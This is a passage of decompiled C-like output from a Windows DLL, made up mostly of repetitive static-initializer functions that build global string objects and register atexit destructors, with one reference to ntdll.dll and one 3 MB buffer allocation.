}
// 10186980: using guessed type _DWORD dword_10186980[2];

//----- (100C6721) --------------------------------------------------------
int sub_100C6721()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10179428);
  sub_1000D17D(dword_10186988, v0);
  return atexit(sub_100F35B1);
}
// 10186988: using guessed type _DWORD dword_10186988[2];

//----- (100C6743) --------------------------------------------------------
int sub_100C6743()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10179464);
  sub_1000D17D(dword_10186998, v0);
  return atexit(sub_100F35BB);
}
// 10186998: using guessed type _DWORD dword_10186998[2];

//----- (100C6765) --------------------------------------------------------
int sub_100C6765()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_101794A8);
  sub_1000D17D(dword_10186990, v0);
  return atexit(sub_100F35C5);
}
// 10186990: using guessed type _DWORD dword_10186990[2];

//----- (100C6787) --------------------------------------------------------
int sub_100C6787()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_101791F0);
  sub_1000D17D(dword_101869D8, v0);
  return atexit(sub_100F35CF);
}
// 101869D8: using guessed type _DWORD dword_101869D8[2];

//----- (100C67A9) --------------------------------------------------------
int sub_100C67A9()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10179230);
  sub_1000D17D(dword_101869C8, v0);
  return atexit(sub_100F35D9);
}
// 101869C8: using guessed type _DWORD dword_101869C8[2];

//----- (100C67CB) --------------------------------------------------------
int sub_100C67CB()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10179288);
  sub_1000D17D(dword_101869B0, v0);
  return atexit(sub_100F35E3);
}
// 101869B0: using guessed type _DWORD dword_101869B0[2];

//----- (100C67ED) --------------------------------------------------------
int sub_100C67ED()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_101792D0);
  sub_1000D17D(dword_101869B8, v0);
  return atexit(sub_100F35ED);
}
// 101869B8: using guessed type _DWORD dword_101869B8[2];

//----- (100C680F) --------------------------------------------------------
int sub_100C680F()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10179314);
  sub_1000D17D(dword_101869A0, v0);
  return atexit(sub_100F35F7);
}
// 101869A0: using guessed type _DWORD dword_101869A0[2];

//----- (100C6831) --------------------------------------------------------
int sub_100C6831()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10179354);
  sub_1000D17D(dword_101869D0, v0);
  return atexit(sub_100F3601);
}
// 101869D0: using guessed type _DWORD dword_101869D0[2];

//----- (100C6853) --------------------------------------------------------
int sub_100C6853()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10179384);
  sub_1000D17D(dword_101869A8, v0);
  return atexit(sub_100F360B);
}
// 101869A8: using guessed type _DWORD dword_101869A8[2];

//----- (100C6875) --------------------------------------------------------
int sub_100C6875()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_101793B4);
  sub_1000D17D(dword_101869C0, v0);
  return atexit(sub_100F3615);
}
// 101869C0: using guessed type _DWORD dword_101869C0[2];

//----- (100C6897) --------------------------------------------------------
int sub_100C6897()
{
  sub_1001EC12((int)dword_10193C6C);
  return atexit(sub_100F3629);
}
// 10193C6C: using guessed type int dword_10193C6C[9];

//----- (100C68AD) --------------------------------------------------------
int sub_100C68AD()
{
  return atexit(sub_100F361F);
}

//----- (100C68B9) --------------------------------------------------------
int sub_100C68B9()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10179104);
  sub_1000D17D(dword_101869E8, v0);
  return atexit(sub_100F3633);
}
// 101869E8: using guessed type _DWORD dword_101869E8[2];

//----- (100C68DB) --------------------------------------------------------
int sub_100C68DB()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10179138);
  sub_1000D17D(dword_101869E0, v0);
  return atexit(sub_100F363D);
}
// 101869E0: using guessed type _DWORD dword_101869E0[2];

//----- (100C68FD) --------------------------------------------------------
int sub_100C68FD()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10178FE0);
  sub_1000D17D(dword_10186A10, v0);
  return atexit(sub_100F3647);
}
// 10186A10: using guessed type _DWORD dword_10186A10[2];

//----- (100C691F) --------------------------------------------------------
int sub_100C691F()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10179010);
  sub_1000D17D(dword_10186A18, v0);
  return atexit(sub_100F3651);
}
// 10186A18: using guessed type _DWORD dword_10186A18[2];

//----- (100C6941) --------------------------------------------------------
int sub_100C6941()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10179040);
  sub_1000D17D(dword_10186A08, v0);
  return atexit(sub_100F365B);
}
// 10186A08: using guessed type _DWORD dword_10186A08[2];

//----- (100C6963) --------------------------------------------------------
int sub_100C6963()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10179070);
  sub_1000D17D(dword_10186A00, v0);
  return atexit(sub_100F3665);
}
// 10186A00: using guessed type _DWORD dword_10186A00[2];

//----- (100C6985) --------------------------------------------------------
int sub_100C6985()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_101790A0);
  sub_1000D17D(dword_101869F0, v0);
  return atexit(sub_100F366F);
}
// 101869F0: using guessed type _DWORD dword_101869F0[2];

//----- (100C69A7) --------------------------------------------------------
int sub_100C69A7()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_101790D0);
  sub_1000D17D(dword_101869F8, v0);
  return atexit(sub_100F3679);
}
// 101869F8: using guessed type _DWORD dword_101869F8[2];

//----- (100C69C9) --------------------------------------------------------
int sub_100C69C9()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10178EA8);
  sub_1000D17D(dword_10186A30, v0);
  return atexit(sub_100F3683);
}
// 10186A30: using guessed type _DWORD dword_10186A30[2];

//----- (100C69EB) --------------------------------------------------------
int sub_100C69EB()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10178F10);
  sub_1000D17D(dword_10186A28, v0);
  return atexit(sub_100F368D);
}
// 10186A28: using guessed type _DWORD dword_10186A28[2];

//----- (100C6A0D) --------------------------------------------------------
int sub_100C6A0D()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10178F8C);
  sub_1000D17D(dword_10186A20, v0);
  return atexit(sub_100F3697);
}
// 10186A20: using guessed type _DWORD dword_10186A20[2];

//----- (100C6A2F) --------------------------------------------------------
int sub_100C6A2F()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10178DC0);
  sub_1000D17D(dword_10186A38, v0);
  return atexit(sub_100F36A1);
}
// 10186A38: using guessed type _DWORD dword_10186A38[2];

//----- (100C6A51) --------------------------------------------------------
int sub_100C6A51()
{
  sub_1000D17D(dword_10186A48, aNtdllDll_4);
  return atexit(sub_100F36AB);
}
// 10186A48: using guessed type _DWORD dword_10186A48[2];

//----- (100C6A6C) --------------------------------------------------------
int sub_100C6A6C()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10178E10);
  sub_1000D17D(dword_10186A50, v0);
  return atexit(sub_100F36B5);
}
// 10186A50: using guessed type _DWORD dword_10186A50[2];

//----- (100C6A8E) --------------------------------------------------------
int sub_100C6A8E()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10178E68);
  sub_1000D17D(dword_10186A40, v0);
  return atexit(sub_100F36BF);
}
// 10186A40: using guessed type _DWORD dword_10186A40[2];

//----- (100C6AB0) --------------------------------------------------------
int sub_100C6AB0()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10178CD4);
  sub_1000D17D(dword_10186A58, v0);
  return atexit(sub_100F36C9);
}
// 10186A58: using guessed type _DWORD dword_10186A58[2];

//----- (100C6AD2) --------------------------------------------------------
int sub_100C6AD2()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10178D10);
  sub_1000D17D(dword_10186A68, v0);
  return atexit(sub_100F36D3);
}
// 10186A68: using guessed type _DWORD dword_10186A68[2];

//----- (100C6AF4) --------------------------------------------------------
int sub_100C6AF4()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10178D68);
  sub_1000D17D(dword_10186A60, v0);
  return atexit(sub_100F36DD);
}
// 10186A60: using guessed type _DWORD dword_10186A60[2];

//----- (100C6B16) --------------------------------------------------------
int sub_100C6B16()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10178C78);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10186A70, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F36E7);
}
// 10186A70: using guessed type _DWORD dword_10186A70[2];

//----- (100C6B6A) --------------------------------------------------------
int sub_100C6B6A()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10178C18);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10186A78, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F36F1);
}
// 10186A78: using guessed type _DWORD dword_10186A78[2];

//----- (100C6BBE) --------------------------------------------------------
int sub_100C6BBE()
{
  sub_1001EC12((int)dword_10193C90);
  return atexit(sub_100F3705);
}
// 10193C90: using guessed type int dword_10193C90[10];

//----- (100C6BD4) --------------------------------------------------------
int sub_100C6BD4()
{
  return atexit(sub_100F36FB);
}

//----- (100C6BE0) --------------------------------------------------------
int sub_100C6BE0()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10178AD0);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10186A80, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F370F);
}
// 10186A80: using guessed type _DWORD dword_10186A80[2];

//----- (100C6C34) --------------------------------------------------------
int sub_100C6C34()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10178868);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10186A88, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F3726);
}
// 10186A88: using guessed type _DWORD dword_10186A88[2];

//----- (100C6C88) --------------------------------------------------------
int sub_100C6C88()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10178730);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10186A90, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F3730);
}
// 10186A90: using guessed type _DWORD dword_10186A90[2];

//----- (100C6CDC) --------------------------------------------------------
int sub_100C6CDC()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_101786E0);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10186A98, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F373A);
}
// 10186A98: using guessed type _DWORD dword_10186A98[2];

//----- (100C6D30) --------------------------------------------------------
int sub_100C6D30()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10178688);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10186AA0, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F3744);
}
// 10186AA0: using guessed type _DWORD dword_10186AA0[2];

//----- (100C6D84) --------------------------------------------------------
int sub_100C6D84()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10178630);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10186AA8, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F374E);
}
// 10186AA8: using guessed type _DWORD dword_10186AA8[2];

//----- (100C6DD8) --------------------------------------------------------
int sub_100C6DD8()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_101785D8);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10186AB0, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F3758);
}
// 10186AB0: using guessed type _DWORD dword_10186AB0[2];

//----- (100C6E2C) --------------------------------------------------------
int sub_100C6E2C()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10178580);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10186AB8, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F3762);
}
// 10186AB8: using guessed type _DWORD dword_10186AB8[2];

//----- (100C6E80) --------------------------------------------------------
int sub_100C6E80()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10178478);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10186AC0, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F376C);
}
// 10186AC0: using guessed type _DWORD dword_10186AC0[2];

//----- (100C6ED4) --------------------------------------------------------
int sub_100C6ED4()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10178340);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10186AC8, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F3776);
}
// 10186AC8: using guessed type _DWORD dword_10186AC8[2];

//----- (100C6F28) --------------------------------------------------------
int sub_100C6F28()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_101782E8);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10186AD0, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F3780);
}
// 10186AD0: using guessed type _DWORD dword_10186AD0[2];

//----- (100C6F7C) --------------------------------------------------------
int sub_100C6F7C()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10178298);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10186AD8, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F378A);
}
// 10186AD8: using guessed type _DWORD dword_10186AD8[2];

//----- (100C6FD0) --------------------------------------------------------
int sub_100C6FD0()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10178248);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10186AE0, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F3794);
}
// 10186AE0: using guessed type _DWORD dword_10186AE0[2];

//----- (100C7024) --------------------------------------------------------
int sub_100C7024()
{
  _DWORD *v1; // eax
  _DWORD v2[4]; // [esp+10h] [ebp-10h] BYREF

  if ( dword_10130320 != 3145728 )
  {
    sub_1008B14A();
    dword_1018532C = operator new(0x300000u);
    if ( !dword_1018532C )
    {
      v1 = sub_1000E7F7(v2, 1, 0);
      v2[3] = 0;
      sub_10007882((int)v1);
    }
    dword_10130320 = 3145728;
  }
  return atexit(sub_100F379E);
}
// 10130320: using guessed type int dword_10130320;

//----- (100C7082) --------------------------------------------------------
int sub_100C7082()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_101781F0);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10186AE8, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F37A8);
}
// 10186AE8: using guessed type _DWORD dword_10186AE8[2];

//----- (100C70D6) --------------------------------------------------------
int sub_100C70D6()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_101781A0);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10186AF0, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F37B2);
}
// 10186AF0: using guessed type _DWORD dword_10186AF0[2];

//----- (100C712A) --------------------------------------------------------
int sub_100C712A()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10178148);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10186AF8, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F37BC);
}
// 10186AF8: using guessed type _DWORD dword_10186AF8[2];

//----- (100C717E) --------------------------------------------------------
int sub_100C717E()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_101780F8);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10186B00, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F37C6);
}
// 10186B00: using guessed type _DWORD dword_10186B00[2];

//----- (100C71D2) --------------------------------------------------------
int sub_100C71D2()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_101780A8);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10186B08, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F37D0);
}
// 10186B08: using guessed type _DWORD dword_10186B08[2];

//----- (100C7226) --------------------------------------------------------
int sub_100C7226()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_101769B0);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10186B10, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F37DA);
}
// 10186B10: using guessed type _DWORD dword_10186B10[2];

//----- (100C727A) --------------------------------------------------------
int sub_100C727A()
{
  sub_1000D17D(dword_10186B18, &word_101769AC);
  return atexit(sub_100F37E4);
}
// 10186B18: using guessed type _DWORD dword_10186B18[2];

//----- (100C7295) --------------------------------------------------------
int sub_100C7295()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_101768A8);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10186B20, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F37EE);
}
// 10186B20: using guessed type _DWORD dword_10186B20[2];

//----- (100C72E9) --------------------------------------------------------
int sub_100C72E9()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_101768F0);
  sub_1000D17D(dword_10186B28, v0);
  return atexit(sub_100F37F8);
}
// 10186B28: using guessed type _DWORD dword_10186B28[2];

//----- (100C730B) --------------------------------------------------------
int sub_100C730B()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017691C);
  sub_1000D17D(dword_10186B38, v0);
  return atexit(sub_100F3802);
}
// 10186B38: using guessed type _DWORD dword_10186B38[2];

//----- (100C732D) --------------------------------------------------------
int sub_100C732D()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_1017694C);
  sub_1000D17D(dword_10186B30, v0);
  return atexit(sub_100F380C);
}
// 10186B30: using guessed type _DWORD dword_10186B30[2];

//----- (100C734F) --------------------------------------------------------
int sub_100C734F()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10176850);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10186B40, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F3816);
}
// 10186B40: using guessed type _DWORD dword_10186B40[2];

//----- (100C73A3) --------------------------------------------------------
int sub_100C73A3()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_101767F0);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10186B48, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F3820);
}
// 10186B48: using guessed type _DWORD dword_10186B48[2];

//----- (100C73F7) --------------------------------------------------------
int sub_100C73F7()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10176798);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10186B50, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F382A);
}
// 10186B50: using guessed type _DWORD dword_10186B50[2];

//----- (100C744B) --------------------------------------------------------
int sub_100C744B()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10176700);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10186B58, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F3834);
}
// 10186B58: using guessed type _DWORD dword_10186B58[2];

//----- (100C749F) --------------------------------------------------------
int sub_100C749F()
{
  sub_1000D17D(dword_10186B60, asc_10176748);
  return atexit(sub_100F383E);
}
// 10186B60: using guessed type _DWORD dword_10186B60[2];

//----- (100C74BA) --------------------------------------------------------
int sub_100C74BA()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_101766B0);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10186B68, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F3848);
}
// 10186B68: using guessed type _DWORD dword_10186B68[2];

//----- (100C750E) --------------------------------------------------------
int sub_100C750E()
{
  wchar_t *v0; // eax
  _DWORD *v1; // eax
  int v2; // eax
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10176318);
  v1 = sub_1000D17D(v4, v0);
  v5 = 0;
  v2 = sub_1000E111((int)v1);
  sub_1000D372(dword_10186B88, v2);
  v5 = -1;
  sub_1000D3AD(v4);
  return atexit(sub_100F3852);
}
// 10186B88: using guessed type _DWORD dword_10186B88[2];

//----- (100C7562) --------------------------------------------------------
int sub_100C7562()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10176414);
  sub_1000D17D(dword_10186BD0, v0);
  return atexit(sub_100F385C);
}
// 10186BD0: using guessed type _DWORD dword_10186BD0[2];

//----- (100C7584) --------------------------------------------------------
int sub_100C7584()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10176444);
  sub_1000D17D(dword_10186B98, v0);
  return atexit(sub_100F3866);
}
// 10186B98: using guessed type _DWORD dword_10186B98[2];

//----- (100C75A6) --------------------------------------------------------
int sub_100C75A6()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10176474);
  sub_1000D17D(dword_10186BA8, v0);
  return atexit(sub_100F3870);
}
// 10186BA8: using guessed type _DWORD dword_10186BA8[2];

//----- (100C75C8) --------------------------------------------------------
int sub_100C75C8()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_101764A4);
  sub_1000D17D(dword_10186BC8, v0);
  return atexit(sub_100F387A);
}
// 10186BC8: using guessed type _DWORD dword_10186BC8[2];

//----- (100C75EA) --------------------------------------------------------
int sub_100C75EA()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_101764D8);
  sub_1000D17D(dword_10186BB0, v0);
  return atexit(sub_100F3884);
}
// 10186BB0: using guessed type _DWORD dword_10186BB0[2];

//----- (100C760C) --------------------------------------------------------
int sub_100C760C()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10176508);
  sub_1000D17D(dword_10186BA0, v0);
  return atexit(sub_100F388E);
}
// 10186BA0: using guessed type _DWORD dword_10186BA0[2];

//----- (100C762E) --------------------------------------------------------
int sub_100C762E()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10176538);
  sub_1000D17D(dword_10186B80, v0);
  return atexit(sub_100F3898);
}
// 10186B80: using guessed type _DWORD dword_10186B80[2];

//----- (100C7650) --------------------------------------------------------
int sub_100C7650()
{
  wchar_t *v0; // eax

  v0 = (wchar_t *)sub_1000CC40((int)&unk_10176568);
  sub_1000D17D(dword_10186BB8, v0);
  return atexit(sub_100F38A2);
}
// 10186BB8: using guessed type _DWORD dword_10186BB8[2];

